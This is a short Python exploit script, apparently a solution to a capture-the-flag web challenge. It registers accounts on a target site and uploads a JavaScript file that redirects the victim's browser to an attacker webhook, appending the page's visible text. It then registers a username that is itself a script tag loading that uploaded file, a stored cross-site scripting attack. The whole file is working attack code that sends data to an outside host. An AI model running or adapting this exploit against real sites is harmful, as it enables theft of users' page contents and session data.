import requests as r
import time
import random
import os
import hashlib

webhook = input("Enter webhook URL: ")
url = "http://jaquiez.dev:6942"
random.seed(time.time())


urmumID = random.randint(99999,999999999)
filename = f"{urmumID}.js"
open(filename,'a').write("""
    document.location=`"""
    + webhook +
    """?c=${document.body.innerText}`"""
)
files ={
    "submission": open(filename)
}

#Create basic user
r1 = r.post(f"{url}/register",data={
    "user":urmumID,
    "pass":"password"
})

r1 = r.post(f"{url}/login",data={
    "user":urmumID,
    "pass":"password"
})
cookie = r1.history[0].headers['Set-Cookie']

r1 = r.post(f"{url}/submit",files=files,headers={
    "Cookie":cookie
})

payload = f"{urmumID}<script src=uploads/{hashlib.md5(str(urmumID).encode()).hexdigest()}/{urmumID}.js defer></script>"
print(payload)
r1 = r.post(f"{url}/register",data={
    "user":payload,
    "pass":"password"
})

r1 = r.post(f"{url}/login",data={
    "user":payload,
    "pass":"password"
})

cookie = r1.history[0].headers['Set-Cookie']

r1 = r.post(f"{url}/submit",files=files,headers={
    "Cookie":cookie
})
os.remove(filename)
print(r1)